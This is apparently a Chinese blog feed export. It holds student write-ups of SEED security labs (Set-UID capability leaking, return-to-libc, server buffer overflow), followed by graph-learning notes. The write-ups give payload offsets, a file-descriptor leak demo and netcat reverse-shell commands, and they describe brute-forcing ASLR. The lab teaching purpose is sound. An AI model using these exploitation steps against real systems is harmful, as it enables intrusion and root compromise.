href="#Task-9-Capability-Leaking" class="headerlink" title="Task 9: Capability Leaking"></a>Task 9: Capability Leaking</h3><p>首先来看setuid()函数作用</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/37.PNG" srcset="/img/loading.gif" alt="37"></p><blockquote><ul><li><p>进程有root权限</p><p>  当有效用户id为root,而真实用户ID和保留用户ID为普通用户,即Set-UID进程,时,会设置有效用户ID,真实用户ID,保留用户ID为参数uid,包括设置为0,即可以通过在Set-UID程序中使用:setuid(geteuid());代码,使进程的真实用户ID,保留用户ID均为0.</p></li><li><p>进程不具有 root 权限</p><p>  若进程不具有 root 权限，那么普通用户使用 setuid() 时参数 uid 只能是自己的，没有权限设置别的数值，否则返回失败.</p></li></ul></blockquote><p>有疑问的地方在于运行setuid()函数之后不应该就没有特权了吗？</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/38.PNG" srcset="/img/loading.gif" alt="38"></p><p>修改cap_leap.c文件</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> fd;  <span class="hljs-keyword">char</span> *v[<span class="hljs-number">2</span>];  <span class="hljs-comment">/* Assume that /etc/zzz is an important system file,</span><span class="hljs-comment">   * and it is owned by root with permission 0644.</span><span class="hljs-comment">   * Before running this program, you should create</span><span class="hljs-comment">   * the file /etc/zzz first. */</span>  fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">"/home/seed/Desktop/lab3/Labsetup/zzz"</span>, O_RDWR | O_APPEND);          <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Cannot open /home/seed/Desktop/lab3/Labsetup/zzz\n"</span>);     <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);  &#125;  <span class="hljs-comment">// Print out the file descriptor value</span>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"fd is %d\n"</span>, fd);  sleep(<span class="hljs-number">1</span>);  <span class="hljs-comment">// Permanently disable the privilege by making the</span>  <span class="hljs-comment">// effective uid the same as the real uid</span>  setuid(getuid());                                  <span class="hljs-keyword">if</span> (fork())&#123; <span class="hljs-comment">/* In the parent process */</span>     <span class="hljs-built_in">close</span> (fd);     <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);   &#125;<span class="hljs-keyword">else</span>   &#123;     <span class="hljs-built_in">write</span> (fd, <span class="hljs-string">"Malicious Data\n"</span>, <span class="hljs-number">15</span>);     <span class="hljs-built_in">close</span> (fd);   &#125;  <span class="hljs-comment">// Execute /bin/sh</span>  <span class="hljs-comment">// v[0] = "/bin/sh"; v[1] = 0;</span>  <span class="hljs-comment">// execve(v[0], v, 0);                             </span>&#125;</code></pre><p>之后运行可以发现已经进行了写入</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/39.PNG" srcset="/img/loading.gif" alt="39"></p><blockquote><p>这是因为,在子进程中,文件描述符fd在进入close()函数前仍然有效,此时虽然进行了setuid(getuid());进行进程的特权解除,随后的非特权进程仍然可以进行修改文件.所以应该在降低特权前运行close(fd),销毁文件描述符.</p></blockquote><h3 id="附加题"><a href="#附加题" class="headerlink" title="附加题"></a>附加题</h3><h4 id="编译challenge-c"><a href="#编译challenge-c" class="headerlink" title="编译challenge.c"></a>编译challenge.c</h4><p>gcc challenge.c -o challenge</p><h4 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h4><p>challenge.c 会读取环境变量”PWD”(当前路径,如”/home/seed/env_lab”), 然后将其中的值传给buffer. 由于程序使用了危险的函数”strcpy”, 因此如果”PWD”的长度过长，会在栈上造成溢出. 本题需要大家通过栈溢出将buffer上面的数组overflowIt的一个位置的值修改成0x01020304.<br>如果攻击成功，程序会输出”Congratulations, you pwned it!”.</p><h4 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h4><ol><li>需要创建新的文件夹, 可能需要GDB调试.</li><li>如果下课前半小时没有完成，可以找助教要一个方便调试的pwn脚本.</li></ol><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2>]]></content>
    
    
    
    <tags>
      
      <tag>software security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Return to libc attack</title>
    <link href="/2021/03/24/Return-to-libc-attack/"/>
    <url>/2021/03/24/Return-to-libc-attack/</url>
    
    <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>return to libc是属于缓冲区溢出的一种攻击</p><ul><li><p>前提：此时堆栈不可执行，所以不能够将恶意代码注入到堆栈当中来进行执行</p></li><li><p>方案：将返回地址修改为现有的代码，例如<code>libc</code>库里面的<code>system()</code>函数，该函数已经加载到内存空间</p></li></ul><h2 id="Task-1-Finding-out-the-Addresses-of-libc-Functions"><a href="#Task-1-Finding-out-the-Addresses-of-libc-Functions" class="headerlink" title="Task 1: Finding out the Addresses of libc Functions"></a>Task 1: Finding out the Addresses of libc Functions</h2><p>既然说我们需要调用<code>system()</code>函数来帮助我们获得root shell，那么首先我们就需要来获得<code>system()</code>函数的位置，通过运行gdb来查看</p><p><img src="/2021/03/24/Return-to-libc-attack/1.PNG" srcset="/img/loading.gif" alt="1"></p><p>以及通过batch模式下来查看</p><p><img src="/2021/03/24/Return-to-libc-attack/2.PNG" srcset="/img/loading.gif" alt="2"></p><p>可以看到system()函数的地址是0xf7e12420，exit()函数的地址是0xf7e04f80</p><h2 id="Task-2-Putting-the-shell-string-in-the-memory"><a href="#Task-2-Putting-the-shell-string-in-the-memory" class="headerlink" title="Task 2: Putting the shell string in the memory"></a>Task 2: Putting the shell string in the memory</h2><p>这一步其实就是传参，将/bin/sh放入内存，需要的时候进行</p><p>方法：</p><p>将<code>/bin/sh</code>通过环境变量的方式来放入到内存当中，参考blog：<a href="https://blog.csdn.net/lsx2017/article/details/86104543?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161676442516780274128887%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161676442516780274128887&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-3-86104543.pc_search_result_no_baidu_js&utm_term=%E5%AF%BC%E5%87%BAshell%E5%8F%98%E9%87%8F%E5%92%8C%E5%AD%90%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F" target="_blank" rel="noopener">shell总结1：Shell全局变量、局部变量和环境变量</a>，之后的子shell中已经将该环境变量加入到内存当中了，通过运行prtenv和retlib来进行验证</p><p><img src="/2021/03/24/Return-to-libc-attack/3.PNG" srcset="/img/loading.gif" alt="3"></p><p>可以看到此时/bin/sh作为环境变量在内存当中的地址是0xffffd40f</p><h2 id="Task-3-Launching-the-Attack"><a href="#Task-3-Launching-the-Attack" class="headerlink" title="Task 3: Launching the Attack"></a>Task 3: Launching the Attack</h2><p>在这一步当中，我们构造badfile的payload，根据注释以及前面的信息，可以得知我们现在已经获取了所要调用的函数的地址以及参数在地址当中的位置，那么现在对于我们来说就需要知道将这些信息放在payload的什么位置/在栈中的位置</p><ul><li>首先我们的目标是调用<code>system()</code>函数，那么就需要修改bof函数的return address为<code>system()</code>的起始位置<code>0xf7e12420</code>，此时我们需要将它填到A+0x4当中</li><li>之后我们要确定<code>/bin/sh</code>所要放到的位置，通过分析执行完bof()函数之后调用<code>system()</code>函数时栈的地址，会发现此时参数/bin/sh应该放在ebp + 0xc的位置上</li><li>之后为了在/bin/sh运行之后正常退出，所以我们需要在调用完system()函数之后调用exit()函数，将system()的返回地址填充为exit()的地址</li></ul><p><img src="/2021/03/24/Return-to-libc-attack/4.PNG" srcset="/img/loading.gif" alt="4"></p><p>可以看到buffer的起始位置和ebp之间的距离，即A和B之间的距离为0x18，所以system()相对于buffer的偏移量就是0x18 + 0x4 = 0x1c，而exit的偏移量就在0x18 + 0x8 = 0x20，/bin/sh所在位置就是0x18 + 0xc = 0x24（）</p><p><strong>因为在执行完bof函数之后，最后肯定是pop出来system()的地址并且进行跳转，此时esp所执行想的就应该是原来的ebp + 8的位置，而当我们执行system()函数的时候，第一步就是push ebp，所以相比之前的ebp，会往上移4位，然后ebp需要在return address之下，而return address需要在传入参数的下面，所以位置分别为0x18 + 0x4,0x18 + 0x8,0x18+0xc，需要深入并细致的分析汇编以及寄存器内容</strong></p><p><img src="/2021/03/24/Return-to-libc-attack/8.PNG" srcset="/img/loading.gif" alt="8"></p><p><img src="/2021/03/24/Return-to-libc-attack/5.PNG" srcset="/img/loading.gif" alt="5"></p><h3 id="Attack-variation-1"><a href="#Attack-variation-1" class="headerlink" title="Attack variation 1"></a>Attack variation 1</h3><p>在badfile中去除exit函数，在这里我们修改跳转地址就好，改为0xAAAAAAAA</p><p><img src="/2021/03/24/Return-to-libc-attack/6.PNG" srcset="/img/loading.gif" alt="6"></p><p>之后在进行运行，会发现仍能够获取权限，但是当我们执行exit来退出的时候，会由于跳转地址而发生segmentation fault</p><h3 id="Attack-variation-2"><a href="#Attack-variation-2" class="headerlink" title="Attack variation 2"></a>Attack variation 2</h3><p>其实原理就是当我们改变名称的时候，会改变环境变量的地址，就只是会打印出消息，而不会获取root shell</p><p><img src="/2021/03/24/Return-to-libc-attack/9.PNG" srcset="/img/loading.gif" alt="9"></p><h2 id="Task-4-Defeat-Shell’s-countermeasure"><a href="#Task-4-Defeat-Shell’s-countermeasure" class="headerlink" title="Task 4: Defeat Shell’s countermeasure"></a>Task 4: Defeat Shell’s countermeasure</h2><p>这个task就是在针对于shell的解决方案，因为最开始的时候我们是将/bin/sh连接到了/bin/zsh，而不是<code>/bin/dash</code>，这是由于dash和bash会自动放弃特权，但是如果说我们增加一个选项 -p，那么命令就会变为<code>/bin/bash -p</code>，这就不会自动放弃特权，而根据提示，<code>execv()</code>可以帮助我们来执行这条命令</p><p>下面开始一步一步拆解解决问题</p><ol><li><p>首先是要获取<code>execv()</code>函数以及<code>exit()</code>函数在内存当中的地址</p><p> <img src="/2021/03/24/Return-to-libc-attack/10.PNG" srcset="/img/loading.gif" alt="10"></p><p> 所以<code>execv()</code>和<code>exit()</code>分别位于0xf7e994b0, 0xf7e04f80</p></li><li><p>把/bin/bash和-p设置为环境变量并且找到他们在内存当中的位置</p><p> <img src="/2021/03/24/Return-to-libc-attack/11.PNG" srcset="/img/loading.gif" alt="11"></p><p> 之后打印出相应的地址信息</p><p> <img src="/2021/03/24/Return-to-libc-attack/12.PNG" srcset="/img/loading.gif" alt="12"></p><p> <img src="/2021/03/24/Return-to-libc-attack/13.PNG" srcset="/img/loading.gif" alt="13"></p><p> 可以看到/bin/bash的地址是<code>0xffffd401</code>，-p的地址是<code>0xffffd515</code></p></li><li><p>之后就是分析栈上面的内容，ipad上面有，可以分析出<code>execv()</code>要放在距离buffer首地址偏移量位0x1c的地方，<code>exit()</code>要放在距离buffer首地址0x20的地方，而pastname放在0x24，argv[]数组就放在了从0x28开始的位置上，并且根据打印出来的信息，我们能够得到input[]的其实位置以及相对偏移量</p><p> <img src="/2021/03/24/Return-to-libc-attack/14.PNG" srcset="/img/loading.gif" alt="14"></p><p> 之后就是根据信息来构造payload</p></li></ol><p><img src="/2021/03/24/Return-to-libc-attack/16.PNG" srcset="/img/loading.gif" alt="16"></p><p>之后进行运行，成功获得root shell</p><p><img src="/2021/03/24/Return-to-libc-attack/15.PNG" srcset="/img/loading.gif" alt="15"></p><h2 id="Task-5-Optional-Return-Oriented-Programming"><a href="#Task-5-Optional-Return-Oriented-Programming" class="headerlink" title="Task 5 (Optional): Return-Oriented Programming"></a>Task 5 (Optional): Return-Oriented Programming</h2><p>本来我们是要在调用system函数之前调用setuid(0)，而实际上需要在bof结束之后调用10次foo，然后再调用execv()</p><p>首先，我们需要获得foo、execv以及exit在内存当中的位置分别为<code>0x565562b0,0xf7e994b0,0xf7e04f80</code></p><p><img src="/2021/03/24/Return-to-libc-attack/17.PNG" srcset="/img/loading.gif" alt="17"></p><p>之后结合栈里面信息进行修改</p><p><img src="/2021/03/24/Return-to-libc-attack/18.PNG" srcset="/img/loading.gif" alt="18"></p>]]></content>
    
    
    
    <tags>
      
      <tag>software security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Buffer Overflow Attack server</title>
    <link href="/2021/03/16/Buffer-Overflow-Attack-server/"/>
    <url>/2021/03/16/Buffer-Overflow-Attack-server/</url>
    
    <content type="html"><![CDATA[<h1 id="Buffer-Overflow-Attack-Server-Version"><a href="#Buffer-Overflow-Attack-Server-Version" class="headerlink" title="Buffer Overflow Attack(Server Version)"></a>Buffer Overflow Attack(Server Version)</h1><h2 id="task-1：Get-familiar-with-the-shellcode"><a href="#task-1：Get-familiar-with-the-shellcode" class="headerlink" title="task 1：Get familiar with the shellcode"></a>task 1：Get familiar with the shellcode</h2><p>就是按照步骤来实现shell命令的修改，为了测试，在shellcode文件夹下面创建了temp文件</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/1.PNG" srcset="/img/loading.gif" alt="1"></p><p>首先是在<code>shellcode_32.py</code>文件当中，将原来的line 2的命令修改为<code>&quot;rm /home/seed/Desktop/lab1/Labsetup/shellcode/temp        *&quot;</code>，之后运行py文件并且编译call_shellcode.c文件，运行后可以看到temp文件被删除</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/2.PNG" srcset="/img/loading.gif" alt="2"></p><p><strong>64位的和32位的命令是一样的，下面只展示成功时候的截图</strong></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/3.PNG" srcset="/img/loading.gif" alt="3"></p><h2 id="task-2：Level-1-Attack"><a href="#task-2：Level-1-Attack" class="headerlink" title="task 2：Level 1 Attack"></a>task 2：Level 1 Attack</h2><p>此时相当于是已经建立好了attacker和server之间的连接，当执行下面命令后</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/4.PNG" srcset="/img/loading.gif" alt="4"></p><p>会在server端出现</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/5.PNG" srcset="/img/loading.gif" alt="5"></p><p>之后，我们要通过构造<code>badfile</code>文件，让badfile来覆盖掉返回地址，使得之后返回的地址是shellcode在栈上的位置，或者指向shellcode前面的nop指令。</p><p><strong>思路：</strong>进行代码分析，首先来看<code>stack.c</code>，也就是<code>buffer overflow vulnerability</code>的代码，它的基本思路是这样的：首先，<code>main()</code>函数会开一个517个byte的局部变量<code>str[]</code>，用来存储我们所需要写入的字节，之后将str的首字节压入栈中，作为<code>dummy_function()</code>的参数，而<code>dummy_function()</code>最主要的作用就是将str首地址并调用了bof()函数，该函数的作用是开一个<code>buffer[]</code>，并且将<code>str</code>里面的内容写入到<code>buffer</code>里面。而<code>exploit.py</code>的文件内容实际上就是构造<code>badfile</code>里面的内容（将<code>content</code>写入到<code>badfile</code>），而<code>badfile</code>就是输入的东西，写入到str，之后就是<code>strcpy</code>到<code>buffer</code>并且覆盖<code>return address</code></p><p>我们已经知道了ebp的地址是<code>0xffffd318</code>，而返回地址的起始地址就是ebp + 4，就是<code>0xffffd31c</code>，距离buffer首地址0x74，就是116个byte，而shellcode随便放在返回地址上面，这里放在<code>ebp + 12</code>处，也就是0xffffd324，距离buffer首地址0x7c</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/6.PNG" srcset="/img/loading.gif" alt="6">)<img src="/2021/03/16/Buffer-Overflow-Attack-server/7.PNG" srcset="/img/loading.gif" alt="7"></p><p>之后在主机上开一个监听端口，<code>nc -nv -l 9090</code>，然后运行exploit.py文件<code>./exploit.py</code>以及<code>cat badfile | nc 10.9.0.5 9090</code></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/8.PNG" srcset="/img/loading.gif" alt="8"></p><p>reverse shell成功</p><h2 id="task-3：Level-2-Attack"><a href="#task-3：Level-2-Attack" class="headerlink" title="task 3：Level-2 Attack"></a>task 3：Level-2 Attack</h2><p>在这个task里面，给我们的hint会变少，运行echo hello，会发现只给了Buffer的起始位置是0xffffd258，我们不知道buffer具体的大小，但是可以得知范围是在[100，300]之间，同时需要之构造一个就能够解决这个范围内所有的变化</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/9.PNG" srcset="/img/loading.gif" alt="9"></p><ul><li>针对于buffer的范围，我们选择直接将300byte来作为buffer的区域，同时，shellcode的起始位置也是可以找到的，<strong>我们选择将从buffer首地址开始到300+8都填充为我们shellcode的起始位置</strong>，偏移量308 = 0x134</li><li>针对于如何设置返回地址/shellcode的起始位置，返回地址要指向偏移量308以及之后的位置，在这里设置为了312 = 0x138，所以返回的地址就是0xffffd258 + 0x138 = 0xffffd390</li></ul><p>shellcode无需修改，仍然是这个命令，修改后的部分code如下</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/10.PNG" srcset="/img/loading.gif" alt="10"></p><p>之后按照上面的命令顺序在运行一遍，能够reverse shell，成功！</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/11.PNG" srcset="/img/loading.gif" alt="11"></p><h2 id="task-4：-Level-3-Attack"><a href="#task-4：-Level-3-Attack" class="headerlink" title="task 4： Level-3 Attack"></a>task 4： Level-3 Attack</h2><p>在这个task里面，我们的目标服务器运行的是64位的程序，首先先echo hello来看一下打印出来的信息</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/12.PNG" srcset="/img/loading.gif" alt="12"></p><p>可以看到我们能够知道buffer的起始地址以及rbp的地址，同时问题是不能出现1byte的0，否则strcpy函数就会停止复制，解决方法是既然要跳转的shellcode一定会是含有0x00，那么就直接把shellcode放在buffer里面，这样在最后strcpy的时候，会将要跳转的位置进行修改后才停止（要注意buffer的大小），在这里buffer的大小位0xd0 = 208bytes，而shellcode在这里是能够放下的</p><p>把shellcode放在buffer起始位置，然后返回地址的偏移量是0xd0 + 8 = 0xd8</p><p>之后将相应的code进行修改</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/13.PNG" srcset="/img/loading.gif" alt="13"></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/14.PNG" srcset="/img/loading.gif" alt="14"></p><p>然后再按照之前命令进行运行，reverse shell成功！</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/15.PNG" srcset="/img/loading.gif" alt="15"></p><h2 id="task-5：Level-4-Attack"><a href="#task-5：Level-4-Attack" class="headerlink" title="task 5：Level-4 Attack"></a>task 5：Level-4 Attack</h2><p>思路：在这里，buffer是空间较小的，不足以放下我们的shellcode，但是需要注意的是，每次都是先将badfile作为输入写入到main里面的str的位置，然后才会去strcpy到我们的buffer里来进行覆盖返回地址，所以在这里的解决方法就是将shellcode写入到str里面，但是不strcpy到下面，而是将返回地址修改位shellcode在str里面的地址</p><p>首先，还是先echo hello</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/16.PNG" srcset="/img/loading.gif" alt="16"></p><p>我们能够知道rbp的地址是0x00007fffffffe1a0，而buffer的首地址是0x00007fffffffe140，此时相距0x60 = 96bytes</p><p>之后需要用到gdb来调试，在这里需要修改makefile，并且重新编译并且启动容器</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/17.PNG" srcset="/img/loading.gif" alt="17"></p><p>分别运行<code>gdb stack-L4，b main，r，p /x &amp;str</code>命令来获取str的地址</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/18.PNG" srcset="/img/loading.gif" alt="18"></p><p>之后我们需要找到rbp的位置来确定相对偏移量，将断点设在bof函数，然后查看rbp寄存器的值就好</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/20.PNG" srcset="/img/loading.gif" alt="20"></p><p>所以，str和rbp之间的相对的偏移量是0x430</p><p>之后结合运行时候rbp的地址是0x00007fffffffe1a0，可以计算出str的地址是0x00007fffffffe5d0，同时将shellcode存放在相对str起始位置256偏移量的地方，所以shellcode的地址就是0x00007fffffffe6d0，而return address相对于buffer的偏移量是0x68</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/21.PNG" srcset="/img/loading.gif" alt="21"></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/22.PNG" srcset="/img/loading.gif" alt="22"></p><p>成功！</p><h2 id="task-6：Experimenting-with-the-Address-Randomization"><a href="#task-6：Experimenting-with-the-Address-Randomization" class="headerlink" title="task 6：Experimenting with the Address Randomization"></a>task 6：Experimenting with the Address Randomization</h2><p>打开栈地址随机化并且发送echo hello命令</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/23.PNG" srcset="/img/loading.gif" alt="23"></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/24.PNG" srcset="/img/loading.gif" alt="24"></p><p>可以看到每次栈的栈帧指针和buffer起始位置都变化了，但是buffer分配的缓冲区大小不变。</p><p>采用暴力破解来击败随机化策略：原理是任意猜一组当前栈帧指针位置和buffer首地址，只要保证buffer size为0x70即可，然后不停给server发送badfile，由于server栈地址一直在变化，总有一次可以正好变成你猜的这组地址，然后就能获取reverse shell了。</p><p>好吧，是我脸黑</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/25.PNG" srcset="/img/loading.gif" alt="25"></p><h2 id="task-7：Experimenting-with-Other-Countermeasures"><a href="#task-7：Experimenting-with-Other-Countermeasures" class="headerlink" title="task 7：Experimenting with Other Countermeasures"></a>task 7：Experimenting with Other Countermeasures</h2><p>在makefile中把 -fno-stack-protector注释掉。然后make，并且单独运行stack-L1</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/26.PNG" srcset="/img/loading.gif" alt="26"></p><p>可以看到stack smashing detected，保护机制丢弃了这个输入</p><p>下面是使得堆栈不可执行，修改makefile文件，并重新编译运行</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/27.PNG" srcset="/img/loading.gif" alt="27"></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/28.PNG" srcset="/img/loading.gif" alt="28"></p><p>完成！</p>]]></content>
    
    
    
    <tags>
      
      <tag>software security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Graph Representation learning</title>
    <link href="/2021/03/03/Graph-Representation-learning/"/>
    <url>/2021/03/03/Graph-Representation-learning/</url>
    
    <content type="html"><![CDATA[<h2 id="2-Background-amp-Traditional-approaches"><a href="#2-Background-amp-Traditional-approaches" class="headerlink" title="2.Background &amp; Traditional approaches"></a>2.Background &amp; Traditional approaches</h2><h3 id="2-3-Graph-Laplacians-and-Spectral-Methods-图拉普拉斯和谱图方法"><a href="#2-3-Graph-Laplacians-and-Spectral-Methods-图拉普拉斯和谱图方法" class="headerlink" title="2.3 Graph Laplacians and Spectral Methods(图拉普拉斯和谱图方法)"></a>2.3 Graph Laplacians and Spectral Methods(图拉普拉斯和谱图方法)</h3><p>邻接矩阵可以无信息损失的表示图，而具有同样的一些效果的矩阵被称为拉普拉斯矩阵，这些矩阵是由邻接矩阵通过变换得到的</p><h4 id="2-3-1-Graph-Laplacians"><a href="#2-3-1-Graph-Laplacians" class="headerlink" title="2.3.1 Graph Laplacians"></a>2.3.1 Graph Laplacians</h4><ul><li><strong>Unnormalized Laplacian非规范化的拉普拉斯式</strong></li></ul><p><img src="/2021/03/03/Graph-Representation-learning/2.3-1.PNG" srcset="/img/loading.gif" alt="2.3-1"></p><h4 id="2-3-2-Graph-Cuts-and-clustering"><a href="#2-3-2-Graph-Cuts-and-clustering" class="headerlink" title="2.3.2 Graph Cuts and clustering"></a>2.3.2 Graph Cuts and clustering</h4><p>在这一节当中会介绍使用拉普拉斯矩阵，在完全连通图中给出节点的最优聚类（optimal cluster）。</p><p><strong>Graph cuts</strong></p><p>首先，我们先需要找的用来衡量分割好坏的量，称之为<code>cut value</code>，而其值的定义如下：</p><p><img src="/2021/03/03/Graph-Representation-learning/2.3-2.PNG" srcset="/img/loading.gif" alt="2.3-2"></p><p>换句话说，就是<strong>有的多少条边越过了我们所划分的不同子集的边界</strong>，而所谓的最优聚类就算是找到cut value最小的划分方式</p><p><strong>缺点：倾向于把图划分成独立的点（稍微有一些不理解！！！）</strong></p><p>改进方法：不仅仅是寻找最小化切割的方式，并且要使得分区是较大的，引入<code>ratio cut</code>：</p><p><img src="/2021/03/03/Graph-Representation-learning/2.3-3.PNG" srcset="/img/loading.gif" alt="2.3-3"></p><p>此时，如果是较小的分区，那么分母就会是比较小的，进而ratio cut变大</p><p>同时还有一种解决方法——<code>Ncut</code>：</p><p><img src="/2021/03/03/Graph-Representation-learning/2.3-4.PNG" srcset="/img/loading.gif" alt="2.3-4"></p><p><strong>使用拉普拉斯谱最小化RatioCut</strong></p><p>目标是通过拉普拉斯谱来找到最小的ratiocut</p><blockquote><p>最小化目标定义为，<br><img src="/2021/03/03/Graph-Representation-learning/2.3-5.PNG" srcset="/img/loading.gif" alt="2.3-5"></p><p>为了解决NP难问题，将a的条件放宽到，满足上述2个条件的实值向量即可。<br>根据瑞利-里兹定理，这个优化问题的解是由L的第二小的特征值对应的特征向量，因此，我们可以通过设置a为第二小的特征向量，来逼近RatioCut的最小值。<br>总而言之，拉普拉斯矩阵的第二小的特征向量是离散向量的连续近似，它给出了一个最优的聚类分配。<br><img src="/2021/03/03/Graph-Representation-learning/2.3-6.PNG" srcset="/img/loading.gif" alt="2.3-6"></p></blockquote><h4 id="2-3-3-Generalized-spectral-clustering"><a href="#2-3-3-Generalized-spectral-clustering" class="headerlink" title="2.3.3 Generalized spectral clustering"></a>2.3.3 Generalized spectral clustering</h4><p>上一节，我们找到了一个将图分成两个簇的最优划分。那么，我们也可以将这种方法推广到K个簇的最优划分问题上。</p><p>这种一般方法的步骤如下：<br><img src="/2021/03/03/Graph-Representation-learning/2.3-8.PNG" srcset="/img/loading.gif" alt="2.3-8"></p><p>4、使用K均值聚类方法来聚合，从而在最优划分的条件下，将图划分成K簇。</p><h3 id="2-4-Towards-Learned-Representations"><a href="#2-4-Towards-Learned-Representations" class="headerlink" title="2.4 Towards Learned Representations"></a>2.4 Towards Learned Representations</h3><h1 id="Part-Ⅰ：Node-Embedding"><a href="#Part-Ⅰ：Node-Embedding" class="headerlink" title="Part Ⅰ：Node Embedding"></a>Part Ⅰ：Node Embedding</h1><h2 id="3-Neighborhood-Reconstruction-Methods"><a href="#3-Neighborhood-Reconstruction-Methods" class="headerlink" title="3.Neighborhood Reconstruction Methods"></a>3.Neighborhood Reconstruction Methods</h2><p>什么是node embedding and why we need？</p><p>有监督的机器学习都要经历以下几个步骤：首先在原始数据上进行特征工程（因为计算机无法直接识别一个抽象的东西，例如graph或者图片等，需要用计算机能够理解的方式表示出来），得到结构化的数据，接着确定机器学习算法，最终训练得到模型。在这个过程中，特征工程是十分耗时费力的。因此我们更喜欢能够自动获取这些特征的方式（如深度学习）。</p><p>而node embedding就是将计算机难以理解的raw data转变为可以理解的structure data，我们通过d维空间上的向量来表示一个节点，d是用来衡量节点信息的，d越大，往往代表节点所包含的信息越大，同时还要求embedding的过程是可逆的，即我们还能从所有向量中推测出原来的图的形式，同时为了评判这个过程的好坏，引入了衡量/相似函数similarity以及损失函数loss</p><p>下面是一个案例，将左边的图结构的节点用一个二维向量来表示（当然在实际项目中，embedding向量通常会有几十甚至几百个维度，这里采用二维向量只是为了方便可视化）。可以看到，在右边的图上，比较接近的点在网络中的关系也比较紧密。</p><p>但是，传统的深度学习框架很难解决Network Embedding，主要原因有以下几点：</p><p>CNN用于固定大小的图像/网格，即像素点的拓扑结构使单一的、固定的。</p><p>RNNs或word2vec用于文本/序列，即节点的次序是固定的。</p><p>而网络（Networks）的结构要复杂的多得多！网络拥有更加复杂的拓扑结构，且节点的顺序并不是固定的。更有甚者，网络是动态变化的。<br>因此，我们接下来讨论网络中的embedding nodes。</p><p>在第三章中，我们关心的是图的结构信息，所以忽略掉了所有的节点特征以及其他信息，同时我们的目标是在经过embedding之后，d维空间上两个向量的相似性和在图上两个节点的相似性基本上是很像的，在这里，我们首先要定义好什么是图上节点的相似性，之后才能构造编码函数并衡量向量空间上是否相似</p><p>第28页</p><p>假设左边就是一个我们需要输入的图结构，希望通过一个两层的神经网络来学习我们target node的一个新的表示，首先找到A的邻居B,C,D，之后再找的话就是找BCD的邻居，找到之后将相应的信息进行聚合，聚合之后会得到一层神经网络的结果，之后再次进行聚合，会得到A的经过两层神经网络的消息传递之后的结果</p>]]></content>
    
    
    
    <tags>
      
      <tag>Graph representation learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统lab6实验报告</title>
    <link href="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <url>/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</url>
    
